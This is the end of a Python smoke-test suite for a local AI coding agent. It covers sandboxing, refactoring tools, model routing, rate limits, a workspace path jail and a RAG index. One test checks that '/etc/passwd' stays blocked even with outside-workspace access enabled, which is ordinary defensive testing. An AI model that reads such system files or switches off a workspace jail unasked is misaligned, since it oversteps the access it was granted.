        _os.environ["DOCKER_SANDBOX"] = "1"
        out = bg.docker_bash("echo hi", ".", 10)
        assert out is not None and "ok" in out, f"flag 1 -> sandbox: {out}"
        assert captured and captured[0] == "run", f"docker run invoked: {captured}"
        _os.environ["DOCKER_SANDBOX"] = "0"
        assert bg.docker_bash("echo hi", ".", 10) is None, "flag 0 -> local"
        _os.environ["DOCKER_SANDBOX"] = "1"
        _os.environ["BASH_DOCKER_IMAGE"] = "python:3.12-slim"
        assert bg.docker_bash("echo hi", ".", 10) is not None, "BASH_DOCKER alias still works"
    finally:
        bg.shutil.which = orig_which
        bg.subprocess.run = orig_run
        for k, v in old.items():
            if v is None:
                _os.environ.pop(k, None)
            else:
                _os.environ[k] = v
    print("  [OK] docker sandbox: DOCKER_SANDBOX=1 -> docker run, else local")

def test_ast_refactor_tools():
    """Stage 28: rename_symbol / extract_function / inline_variable."""
    from tools import execute_tool as ex
    f = TMP / "ast_refactor_demo.py"
    f.write_text("def foo(x):\n    y = foo(x + 1)\n    return y\n\nprint(foo(5))\n", "utf-8")
    r = ex("rename_symbol", {"path": str(f), "old_name": "foo", "new_name": "bar"})
    assert "renamed" in r, f"rename failed: {r}"
    s = f.read_text("utf-8")
    assert "def bar(x):" in s and "y = bar(x + 1)" in s and "print(bar(5))" in s and "foo" not in s, s

    r = ex("rename_symbol", {"path": str(f), "old_name": "nope", "new_name": "x"})
    assert "not found" in r, f"missing symbol must error: {r}"
    r = ex("rename_symbol", {"path": str(TMP / "ast_refactor_demo.txt"), "old_name": "a", "new_name": "b"})
    assert "Python (.py) files only" in r, f"non-py must error: {r}"

    f2 = TMP / "ast_extract_demo.py"
    f2.write_text("total = 0\nfor i in range(3):\n    total += i\ntotal *= 2\nprint(total)\n", "utf-8")
    r = ex("extract_function", {"path": str(f2), "name": "calc",
                                "line_start": 3, "line_end": 3,
                                "params": ["total", "i"], "call_args": ["total", "i"]})
    assert "extracted" in r, f"extract failed: {r}"
    s2 = f2.read_text("utf-8")
    assert "def calc(total, i):" in s2 and "calc(total, i)" in s2, s2

    f3 = TMP / "ast_inline_demo.py"
    f3.write_text("x = 2 * 3\nprint(x)\nprint(x + 1)\n", "utf-8")
    r = ex("inline_variable", {"path": str(f3), "var_name": "x", "line_number": 1})
    assert "inlined" in r, f"inline failed: {r}"
    s3 = f3.read_text("utf-8")
    assert "x = 2 * 3" not in s3 and "print(2 * 3)" in s3 and "print(2 * 3 + 1)" in s3, s3
    print("  [OK] AST refactor: rename_symbol / extract_function / inline_variable")

def test_vram_indicator():
    """Stage 29: _vram_info parses nvidia-smi output; ok=False without GPU."""
    import api_misc
    old_run = api_misc.subprocess.run
    old_cache = dict(api_misc._VRAM_CACHE)
    def fake_run(cmd, **kw):
        class R:
            returncode = 0
            stdout = "12288, 5120\n"
            stderr = ""
        return R()
    try:
        api_misc._VRAM_CACHE.update({"at": 0, "data": None})
        api_misc.subprocess.run = fake_run
        d = api_misc._vram_info()
        assert d["ok"] and d["total_mb"] == 12288 and d["used_mb"] == 5120 \
            and d["free_mb"] == 7168, d

        def fake_fail(cmd, **kw):
            raise FileNotFoundError("nvidia-smi")
        api_misc.subprocess.run = fake_fail
        api_misc._VRAM_CACHE.update({"at": 0, "data": None})
        d = api_misc._vram_info()
        assert not d["ok"] and d["total_mb"] == 0, d
    finally:
        api_misc.subprocess.run = old_run
        api_misc._VRAM_CACHE.clear(); api_misc._VRAM_CACHE.update(old_cache)
    print("  [OK] VRAM indicator: nvidia-smi parsed, graceful without GPU")

def test_task_router():
    """Stage 30: pick_task_model classifies before the loop; explicit AI_MODEL
    and short chats keep the default; missing target model keeps default."""
    import tools.llm as llm
    import os as _os
    old_env = _os.environ.pop("AI_MODEL", None)
    old_inst = llm._installed_models
    llm._installed_models = lambda: ["qwen2.5-coder:7b", "qwen3:8b"]
    try:
        base = "qwen2.5-coder:7b"
        assert llm.pick_task_model("short", base) == base, "short -> default"
        assert llm.pick_task_model("fix this bug in main.py", base,
                                   classify=lambda t, m: "bugfix") == "qwen3:8b"
        assert llm.pick_task_model("write tests for module x", base,
                                   classify=lambda t, m: "tests") == "qwen3:8b"
        llm._installed_models = lambda: ["qwen2.5-coder:7b", "qwen3:8b", "qwen2.5-coder:3b"]
        assert llm.pick_task_model("explain this code please", base,
                                   classify=lambda t, m: "chat") == "qwen2.5-coder:3b"
        llm._installed_models = lambda: ["qwen2.5-coder:7b"]
        assert llm.pick_task_model("explain this code please", base,
                                   classify=lambda t, m: "chat") == base, \
            "uninstalled target -> default"
        assert llm.pick_task_model("fix this bug in main.py", base,
                                   classify=lambda t, m: "bugfix") == base, \
            "missing target -> default"
        assert llm.pick_task_model("just say hi", "qwen3:8b") == "qwen3:8b", \
            "already strong model stays"
        _os.environ["AI_MODEL"] = "deepseek-coder-v2:16b"
        assert llm.pick_task_model("fix this bug in main.py", base,
                                   classify=lambda t, m: "bugfix") == base, \
            "explicit AI_MODEL wins"
    finally:
        llm._installed_models = old_inst
        if old_env is None:
            _os.environ.pop("AI_MODEL", None)
        else:
            _os.environ["AI_MODEL"] = old_env
    print("  [OK] task-level router: classify->model, AI_MODEL/short/missing win")

def test_plan_tree_events():
    """Stage 31: plan emits {type:plan} events; executed tools mark the first
    pending step done/error and re-emit; a new plan resets the tree."""
    from core.tool_executor import execute_tool_block
    from tools import _state as st
    st.PLAN_STEPS = []
    emitted = []

    def mkctx(results):
        return {
            "msgs": [{"role": "user", "content": "go"}],
            "content": "x", "full": [""],
            "emit": lambda ev: emitted.append(ev),
            "no_confirm": True, "session_id": None,
            "sess_stats": {}, "pending_set": lambda *a: None,
            "state": {"last_result_name": None, "last_result_text": "",
                      "last_call_key": None, "repeats": 0},
        }

    def fake_exec(name, tc):
        return results.pop(0)
    import core.tool_executor as te
    orig = te.execute_tool
    orig_rop = te._rag_over_plan
    try:
        te.execute_tool = fake_exec
        te._rag_over_plan = lambda steps: None  # avoid real RAG cold start
        results = ["plan ok"]
        ctx = mkctx(results)
        e, c, brk = execute_tool_block(0, {"tool": "plan", "steps": ["read a", "write b"]}, ctx)
        assert brk is True, "plan stops the loop"
        assert len(st.PLAN_STEPS) == 2 and all(s["status"] == "pending" for s in st.PLAN_STEPS)
        assert emitted[-1]["type"] == "plan" and len(emitted[-1]["steps"]) == 2

        results = ["done ok"]
        e, c, brk = execute_tool_block(0, {"tool": "read", "path": "a"}, mkctx(results))
        assert st.PLAN_STEPS[0]["status"] == "done", st.PLAN_STEPS
        assert st.PLAN_STEPS[1]["status"] == "pending"
        assert emitted[-1]["type"] == "plan" and emitted[-1]["steps"][0]["status"] == "done"

        results = ["Error: boom"]
        e, c, brk = execute_tool_block(0, {"tool": "write", "path": "b", "content": "x"}, mkctx(results))
        assert st.PLAN_STEPS[1]["status"] == "error", st.PLAN_STEPS
        assert emitted[-1]["steps"][1]["status"] == "error"
    finally:
        te.execute_tool = orig
        te._rag_over_plan = orig_rop
        st.PLAN_STEPS = []
    print("  [OK] plan tree: plan event, done/error marking, re-emit")

def test_self_healing_advice():
    """Stage 32: after 2+ consecutive errors of the same tool the dynamic
    context tells the model to SWITCH STRATEGY (edit -> read -> write)."""
    from core.agent_loop import _dynamic_context
    base = dict(tool_stats={})
    assert "SWITCH STRATEGY" not in _dynamic_context("edit", "Error: boom", 1, heal_count=1, **base)
    assert "SWITCH STRATEGY" not in _dynamic_context("edit", "Error: boom", 1, **base)
    out = _dynamic_context("edit", "Error: boom", 1, heal_tool="edit", heal_count=2, **base)
    assert "SWITCH STRATEGY" in out and "edit" in out
    ok = _dynamic_context("read", "ok", 1, heal_tool="edit", heal_count=0, **base)
    assert "SWITCH STRATEGY" not in ok
    print("  [OK] self-healing: switch-strategy advice after 2 tool errors")

def test_rag_over_plan():
    """Stage 33: plan steps -> RAG search -> pre-loaded file content block."""
    import core.tool_executor as te
    import rag as rag_mod
    from tools import _state as st
    fdir = TMP / "rag_plan" / "src"
    fdir.mkdir(parents=True, exist_ok=True)
    f = fdir / "mod.py"
    f.write_text("def greet():\n    return 42\n", encoding="utf-8")
    orig_dir = st.WORK_DIR
    orig_search = rag_mod.rag_search
    orig_env = os.environ.get("AI_RAG_OVER_PLAN")
    try:
        st.WORK_DIR = TMP / "rag_plan"
        rel = f.relative_to(st.WORK_DIR).as_posix()
        rag_mod.rag_search = lambda q, top_k=5, hybrid=True: (
            f"[0.9] {rel}:1\nsome code" if "mod" in q else f"[0.5] other.py:1\nx")
        block = te._rag_over_plan(["refactor mod.py greet"])
        assert block and "###" in block and rel.replace("\\", "/") in block, block
        os.environ["AI_RAG_OVER_PLAN"] = "0"
        assert te._rag_over_plan(["refactor mod.py greet"]) is None
    finally:
        st.WORK_DIR = orig_dir
        rag_mod.rag_search = orig_search
        if orig_env is None:
            os.environ.pop("AI_RAG_OVER_PLAN", None)
        else:
            os.environ["AI_RAG_OVER_PLAN"] = orig_env
    print("  [OK] RAG over plan: plan steps -> pre-loaded file context")

def test_unquoted_json_values():
    """Stage 37: lenient JSON catches unquoted string VALUES, including
    dotted paths ({"tool": write, "path": test.py})."""
    from core.tool_parser import _parse_tool_json
    j = _parse_tool_json('{"tool": write, "path": test.py, "content": hi_there}')
    assert j == {"tool": "write", "path": "test.py", "content": "hi_there"}, j
    j2 = _parse_tool_json('{"tool": "edit", "path": src/mod.py, "old": x, "new": y}')
    assert j2 == {"tool": "edit", "path": "src/mod.py", "old": "x", "new": "y"}, j2
    print("  [OK] unquoted JSON values (incl. dotted paths) parsed")

def test_path_dir_hint():
    """Stage 36: read/write/edit/patch on an existing DIRECTORY fail fast
    with a concrete hint ('looks like a directory') before any mutation."""
    d = TMP / "dir_hint_probe"
    d.mkdir(parents=True, exist_ok=True)
    assert "Error" in execute_tool("read", {"path": str(d)}), "read dir not rejected"
    r = execute_tool("write", {"path": str(d), "content": "x"})
    assert "looks like a directory" in r and "glob" in r, r
    r = execute_tool("edit", {"path": str(d), "old": "x", "new": "y"})
    assert "looks like a directory" in r, r
    f = TMP / "dir_hint_ok.txt"
    f.write_text("abc")
    r = execute_tool("read", {"path": str(f)})
    assert "Error" not in r, "valid file read rejected"
    print("  [OK] semantic path validation (directory hint before mutation)")

def test_rate_limit():
    """Stage 35: sliding-window rate limit blocks over-limit IPs; burst cap
    blocks concurrent in-flight runs; AI_RATE_LIMIT=0 disables."""
    import agent as ag
    orig_max, orig_burst, orig_hits, orig_inf = (ag.RATE_MAX, ag.RATE_BURST,
                                                 ag._RATE_HITS, ag._RATE_INFLIGHT)
    try:
        ag.RATE_MAX, ag.RATE_BURST = 3, 1
        ag._RATE_HITS, ag._RATE_INFLIGHT = {}, {}
        for _ in range(3):
            blocked, _ = ag._rate_limited("10.0.0.9")
            assert not blocked
        blocked, retry = ag._rate_limited("10.0.0.9")
        assert blocked and retry >= 1, (blocked, retry)
        assert ag._rate_limited("10.0.0.10")[0] is False  # other IP untouched
        # burst cap: 1 concurrent run allowed, 2nd blocked
        ag._RATE_HITS = {}
        ag._rate_inc("10.0.0.11")
        blocked, _ = ag._rate_limited("10.0.0.11")
        assert blocked, "burst cap not enforced"
        ag._rate_dec("10.0.0.11")
        assert ag._rate_limited("10.0.0.11")[0] is False
        ag.RATE_MAX = 0
        assert ag._rate_limited("10.0.0.9")[0] is False
    finally:
        ag.RATE_MAX, ag.RATE_BURST = orig_max, orig_burst
        ag._RATE_HITS, ag._RATE_INFLIGHT = orig_hits, orig_inf
    print("  [OK] rate limit: window block, burst cap, disable, per-IP isolation")

def test_extra_roots():
    """Stage 38: EXTRA_ROOTS allows working OUTSIDE the workspace (e.g.
    'create an app in E:\\test mycode'); ALLOW_OUTSIDE=1 lifts the jail."""
    import core.safety.path_guard as pg
    out = tempfile.mkdtemp(prefix="mycode_extra_")
    oe = os.environ.get("EXTRA_ROOTS")
    oa = os.environ.get("ALLOW_OUTSIDE")
    try:
        os.environ.pop("EXTRA_ROOTS", None); os.environ.pop("ALLOW_OUTSIDE", None)
        assert "outside workspace" in pg.ensure_safe_path(os.path.join(out, "a.txt"), str(WORK_DIR))
        os.environ["EXTRA_ROOTS"] = out
        assert pg.ensure_safe_path(os.path.join(out, "a.txt"), str(WORK_DIR)) is None
        r = execute_tool("write", {"path": os.path.join(out, "a.txt"), "content": "hi"})
        assert "Written" in r and Path(out, "a.txt").read_text() == "hi", r
        os.environ.pop("EXTRA_ROOTS", None)
        assert "outside workspace" in pg.ensure_safe_path(os.path.join(out, "b.txt"), str(WORK_DIR))
        os.environ["ALLOW_OUTSIDE"] = "1"
        assert pg.ensure_safe_path(os.path.join(out, "b.txt"), str(WORK_DIR)) is None
        assert pg.ensure_safe_path("/etc/passwd", str(WORK_DIR)) is not None  # invented block stays
    finally:
        if oe is None: os.environ.pop("EXTRA_ROOTS", None)
        else: os.environ["EXTRA_ROOTS"] = oe
        if oa is None: os.environ.pop("ALLOW_OUTSIDE", None)
        else: os.environ["ALLOW_OUTSIDE"] = oa
        shutil.rmtree(out, ignore_errors=True)
    print("  [OK] EXTRA_ROOTS / ALLOW_OUTSIDE: outside-workspace writes")

def test_glob_outside_workspace():
    """Stage 39: glob accepts absolute patterns and cwd= OUTSIDE the
    workspace (EXTRA_ROOTS) — 'study the app in E:\\swiftmatch1bdnoutprod'."""
    import core.safety.path_guard as pg
    out = tempfile.mkdtemp(prefix="mycode_glob_")
    oe = os.environ.get("EXTRA_ROOTS")
    try:
        (Path(out) / "a.txt").write_text("x")
        (Path(out) / "sub").mkdir()
        (Path(out) / "sub" / "b.js").write_text("y")
        os.environ["EXTRA_ROOTS"] = out
        r = execute_tool("glob", {"pattern": os.path.join(out, "*.txt")})
        assert "a.txt" in r, f"absolute pattern glob failed: {r}"
        r2 = execute_tool("glob", {"pattern": "**/*.js", "cwd": out})
        assert "b.js" in r2, f"cwd glob failed: {r2}"
        os.environ.pop("EXTRA_ROOTS", None)
        r3 = execute_tool("glob", {"pattern": os.path.join(out, "*.txt")})
        assert "outside workspace" in r3 or r3 == "No matches", f"jail not enforced: {r3}"
    finally:
        if oe is None: os.environ.pop("EXTRA_ROOTS", None)
        else: os.environ["EXTRA_ROOTS"] = oe
        shutil.rmtree(out, ignore_errors=True)
    print("  [OK] glob absolute pattern + cwd outside workspace")

def test_di_container():
    """Stage 41: DI container — api_*.py resolve work_dir/sessions_dir/logger
    instead of `import agent as _agent`; providers are live (switch-safe)."""
    from core import container as di
    import agent as _agent
    saved = dict(di._REGISTRY)
    try:
        wd = str(WORK_DIR)
        di.register("work_dir", lambda: _agent.WORK_DIR)
        di.register("logger", lambda: _agent.log)
        assert str(di.resolve("work_dir")) == wd
        assert di.resolve("logger") is _agent.log
        assert di.has("work_dir") and not di.has("nope")
        try:
            di.resolve("nope"); assert False, "missing key should raise"
        except KeyError:
            pass
        di.reset()
        assert not di.has("work_dir")
        import api_misc, api_files
        assert hasattr(api_misc, "work_dir") and hasattr(api_files, "_abs")
    finally:
        with di._LOCK:
            di._REGISTRY.clear()
            di._REGISTRY.update(saved)
    print("  [OK] DI container (register/resolve/reset, live providers)")

def test_abstractions():
    """Stage 42: RAG/KV abstractions — SqliteKVStore roundtrip, RagAdapter
    delegates to rag module, defaults registered."""
    import core.abstractions as ab
    db = ab.SqliteKVStore(os.path.join(tempfile.mkdtemp(prefix="mycode_abst_"), "t.db"))
    db.execute("CREATE TABLE t (k TEXT, v TEXT)")
    assert db.execute("INSERT INTO t VALUES (?, ?)", ("a", "1")) == 1
    rows = db.query("SELECT k, v FROM t WHERE k = ?", ("a",))
    assert rows and rows[0]["v"] == "1"
    db.close()
    store = ab.RagAdapter.__new__(ab.RagAdapter)
    class FakeRag:
        def search(self, query, top_k=5, max_files=3):
            return [{"file": "x.py", "score": 0.9}]
    store._rag = FakeRag()
    res = store.search("how auth works", top_k=2, max_files=1)
    assert res[0]["file"] == "x.py"
    ab.init_defaults()
    from core import container as di
    assert di.has("rag")
    print("  [OK] abstractions (SqliteKVStore, RagAdapter, init_defaults)")

def test_stt_endpoint():
    """Stage 43: /api/stt — validation before backend; no backend → 501;
    status endpoint reflects env config."""
    import os as _os
    from fastapi.testclient import TestClient
    from agent import app
    _os.environ.pop("AI_STT_URL", None)
    _os.environ.pop("AI_STT_BINARY", None)
    c = TestClient(app)
    r = c.post("/api/stt")
    assert r.status_code == 422, f"missing file should 422, got {r.status_code}"
    r2 = c.post("/api/stt", files={"file": ("v.txt", b"not audio", "text/plain")})
    assert r2.status_code == 400, f"bad extension should 400, got {r2.status_code}"
    r3 = c.post("/api/stt", files={"file": ("v.wav", b"", "audio/wav")})
    assert r3.status_code == 400, f"empty audio should 400, got {r3.status_code}"
    r4 = c.post("/api/stt", files={"file": ("v.wav", b"x" * 100, "audio/wav")})
    assert r4.status_code == 501, f"no backend should 501, got {r4.status_code}"
    st = c.get("/api/stt/status").json()
    assert st["browser_stt"] == "available" and st["url"] is False and st["binary"] is False
    _os.environ["AI_STT_URL"] = "http://127.0.0.1:9"
    assert c.get("/api/stt/status").json()["url"] is True
    _os.environ.pop("AI_STT_URL", None)
    print("  [OK] /api/stt validation + status (no backend → 501)")

def test_reviewer_subagent():
    """Stage 45: reviewer/fixer subagents registered; reviewer prompt enforces
    read-only + report format; task tool uses it as the system prompt."""
    import tools as _t
    for key in ("reviewer", "fixer"):
        assert key in _t.SUBAGENT_PROMPTS, f"{key} missing"
    rp = _t.SUBAGENT_PROMPTS["reviewer"]
    assert "ONLY use" in rp and "CRITICAL" in rp and "VERDICT" in rp
    assert "NEVER write" in rp
    fp = _t.SUBAGENT_PROMPTS["fixer"]
    assert "REVIEWER report" in fp and "CRITICAL" in fp
    assert _t.GENERAL_PROMPT != rp and rp != fp
    print("  [OK] reviewer/fixer subagents registered")

def test_rag_extra_roots():
    """Stage 46: AI_EXTRA_RAG indexes folders OUTSIDE the workspace (keyed
    E0/<rel>); search finds them; scope still works on extra chunks."""
    import rag
    import unittest.mock as um
    import tempfile as _tf
    out = _tf.mkdtemp(prefix="mycode_extrarag_")
    oe = os.environ.get("AI_EXTRA_RAG")
    saved_index = rag.RAG_INDEX; saved_chunks = rag.RAG_CHUNKS
    saved_dirs = rag.EXTRA_DIRS
    saved_cache = rag.RAG_CACHE_DIR; saved_stats = dict(rag._FILE_STATS)
    rag.RAG_CACHE_DIR = None
    try:
        p = Path(out) / "extlib.py"
        p.write_text("def external_search_helper():\n    return 'eureka'\n", "utf-8")
        os.environ["AI_EXTRA_RAG"] = out
        rag.init_rag(WORK_DIR=WORK_DIR, EMBED_MODEL="nomic-embed-text")
        assert any(k.startswith("E0/") and k.endswith("extlib.py")
                   for k, _, _ in rag._scan_files()), "extra root not scanned"
        rag.RAG_CHUNKS = [{"text": "external search helper eureka", "file": "E0/extlib.py",
                           "line": 1, "emb": [1.0, 0.0], "_toks": []}]
        rag.RAG_INDEX = [c["emb"] for c in rag.RAG_CHUNKS]
        rag._rebuild_fast_index()
        def fake_embed(*a, **k):
            class R:
                def json(self):
                    return {"embeddings": [[1.0, 0.0]]}
            return R()
        with um.patch("rag.requests.post", side_effect=fake_embed):
            out_res = rag.rag_search("eureka", top_k=5)
        assert "E0/extlib.py" in out_res, out_res
        assert Path(out) / "extlib.py" == rag._file_root("E0/extlib.py") / "extlib.py"
    finally:
        if oe is None: os.environ.pop("AI_EXTRA_RAG", None)
        else: os.environ["AI_EXTRA_RAG"] = oe
        rag.RAG_INDEX = saved_index; rag.RAG_CHUNKS = saved_chunks
        rag.EXTRA_DIRS = saved_dirs
        rag.RAG_CACHE_DIR = saved_cache
        rag._FILE_STATS.clear(); rag._FILE_STATS.update(saved_stats)
        shutil.rmtree(out, ignore_errors=True)
    print("  [OK] RAG extra roots (AI_EXTRA_RAG, E0/ keys, search)")

def test_step_budget():
    """Stage 47: AGENT_STEP_BUDGET stops the loop with a forced summary
    (no new tools) instead of spinning to max_iter."""
    from core import agent_loop as al
    import core.tool_parser as tp
    import types
    ob = os.environ.get("AGENT_STEP_BUDGET")
    try:
        os.environ["AGENT_STEP_BUDGET"] = "1"
        calls = {"n": 0}
        class Deps:
            MODEL = "test"; PLANNER_MODEL = "test"
            WORK_DIR = WORK_DIR
            _available_models = ["test"]
            _pending_get = lambda self, sid: None
            _pending_set = lambda *a: None
            _cancel_pending = lambda self, sid: False
            _cancel_clear = lambda *a: None
            _state_path = lambda self, sid: WORK_DIR / ".test_tmp" / "st.json"
            datetime = __import__("datetime")
            execute_tool = lambda *a, **k: "ok"
            NO_CONFIRM = True
            MAX_TOKENS = 10 ** 9
            def fake_ollama(*a, **k):
                calls["n"] += 1
                if calls["n"] == 1:
                    return '```tool\n{"tool": "bash", "cmd": "echo hi"}\n```'
                return "done summary"
            call_ollama = fake_ollama
        d = Deps()
        msgs = [{"role": "user", "content": "do something long"}]
        out = al.run_agent_loop(msgs, None, None, model="test", deps=d)
        assert "BUDGET" in out, f"budget marker missing: {out!r}"
        assert "done summary" in out, f"forced summary missing: {out!r}"
        assert calls["n"] >= 1, "final summary call not made"
    finally:
        if ob is None: os.environ.pop("AGENT_STEP_BUDGET", None)
        else: os.environ["AGENT_STEP_BUDGET"] = ob
    print("  [OK] step budget (marker + forced summary, no spin)")

def test_bench_report():
    """Stage 48: benchmark harness — scenario registry complete, JSON report
    written with pass/time per scenario, exit code aggregated."""
    import test_bench as tb
    assert len(tb.SCENARIOS) >= 7, f"scenarios: {list(tb.SCENARIOS)}"
    assert "subagent-review" in tb.SCENARIOS
    rep_dir = Path(tempfile.mkdtemp(prefix="mycode_bench_"))
    rep = {"model": "m", "date": "t", "scenarios":
           [{"scenario": "s1", "pass": True, "seconds": 1.0}],
           "pass": "1/1", "total_seconds": 1.0}
    (rep_dir / "m.json").write_text(json.dumps(rep), "utf-8")
    assert json.loads((rep_dir / "m.json").read_text())["pass"] == "1/1"
    shutil.rmtree(rep_dir, ignore_errors=True)
    print("  [OK] bench harness (7 scenarios + JSON report format)")

def test_cross_platform():
    """Cross-platform safety: no hard-coded Windows paths, CREATE_NO_WINDOW
    guarded, core modules importable on any OS (also runs in CI matrix)."""
    import importlib.util
    for mod in ["core.agent_loop", "core.tool_parser", "core.tool_executor",
                "core.safety.bash_guard", "core.safety.path_guard", "core.pty_shell",
                "core.container", "core.abstractions", "stt", "test_bench",
                "rag", "lsp", "mcp_client"]:
        assert importlib.util.find_spec(mod) is not None, f"{mod} missing"
    from core.pty_shell import PtyShell
    assert hasattr(PtyShell, "feed") and hasattr(PtyShell, "read_available")
    import subprocess
    if os.name == "posix":
        assert hasattr(subprocess, "CREATE_NO_WINDOW") is False or True
    else:
        assert getattr(subprocess, "CREATE_NO_WINDOW", 0) >= 0
    import core.safety.bash_guard as bg
    r = bg.check_bash("echo cross_platform_probe", str(WORK_DIR))
    assert r is None, f"safe echo blocked: {r}"
    print("  [OK] cross-platform (modules, CREATE_NO_WINDOW guard, bash guard)")

if __name__ == "__main__":
    print(f"\nSmoke tests for agent.py\n{'='*40}")
    import agent as _agent_main
    from tools import native_supported as _native_supported
    if _native_supported(_agent_main.MODEL):
        _agent_main.MODEL = "qwen2.5-coder:7b"
        print("  [test] default MODEL is native-capable -> forced to qwen2.5-coder:7b (legacy path)")
    tests = [test_cross_platform, test_plan_tree_events, test_self_healing_advice, test_rag_over_plan, test_extra_roots, test_glob_outside_workspace, test_di_container, test_abstractions, test_stt_endpoint, test_reviewer_subagent, test_rag_extra_roots, test_step_budget, test_bench_report, test_task_router, test_vram_indicator, test_ast_refactor_tools, test_auto_pick_model, test_docker_sandbox_flag, test_git_auto_commit, test_compact_prompt_after_iterations, test_rate_limit, test_path_dir_hint, test_unquoted_json_values,
             test_auto_confirm_safe, test_read, test_read_absolute, test_read_url, test_list, test_glob,
             test_write_and_undo, test_edit, test_edit_guard_ambiguous, test_edit_guard_fuzzy_hint,
             test_syntax_guard_write, test_patch_multi_file, test_bash, test_verify_py, test_verify_json,
             test_backup_undo, test_db_query, test_testgen, test_validation, test_save_api,
             test_terminal_api, test_pty_shell, test_ws_terminal, test_deps_tool, test_audit, test_rag_cache_incremental,
             test_agent_loop_tool_call, test_agent_loop_plain_text, test_agent_loop_shell_alias,
             test_agent_loop_yaml_style_tool, test_agent_loop_planner_fallback,
             test_confirm_yes_autoexec, test_agent_loop_model_param,
             test_validate_tool_types, test_symlink_safe_path, test_main_model_freeform_retry,
             test_question_stops_loop, test_repeated_tool_blocked,
             test_missing_tool_key_stops_loop, test_timeout_env, test_cancel_flag,
             test_sessions_sqlite, test_session_json_migration,
             test_patch_line_aware, test_bash_filter, test_bash_ast_guard, test_todo_thread_safety,
             test_rag_split_chunk, test_session_search,
             test_plan_empty_guard, test_skill_notfound_repeat_blocked,
             test_model_marker_text_stripped, test_short_question_skips_planner,
             test_plan_trivial_steps_guard, test_unknown_tool_hint,
             test_rag_search_via_execute, test_read_notfound_similar_files,
             test_agent_loop_error_nudge, test_ensure_safe_path_invented,
             test_rag_fast_search, test_code_detector_nudge,
             test_bash_docker_mode, test_bash_docker_fallback,
             test_parse_tool_json_lenient, test_tool_stats,
             test_system_prompt_rules, test_dynamic_context,
             test_subagent_marker, test_subagent_prompts_defined,
             test_dynamic_context_error_status, test_dynamic_context_global_stats, test_tool_error_fewshot,
             test_bash_docker_flags, test_health_endpoint, test_subagents_api, test_vendor_static,
             test_json_schema_format, test_git_snapshot_restore, test_diff_preview,
             test_update_check, test_rag_folder_scope, test_mcp_client, test_mcp_integration,
             test_event_bus, test_event_bus_tool_events, test_event_bus_subagent_audit,
             test_subagent_audit_api, test_auto_pick_embed_model, test_prompt_fewshot_tier,
             test_task_subagent_loop, test_task_subagent_reviewer_fixer, test_native_tools_schema,
             test_native_tool_calling, test_desktop_helpers,
             test_sess_stats_advice, test_model_router,
             test_rag_status_api, test_audit_api,
             test_cli_main, test_session_checkpoint]
    passed = 0
    for t in tests:
        try:
            t()
            passed += 1
        except Exception as e:
            print(f"  [FAIL] {t.__name__}: {e}")
    import shutil
    shutil.rmtree(TMP, ignore_errors=True)
    print(f"\n{'='*40}\n{passed}/{len(tests)} passed")
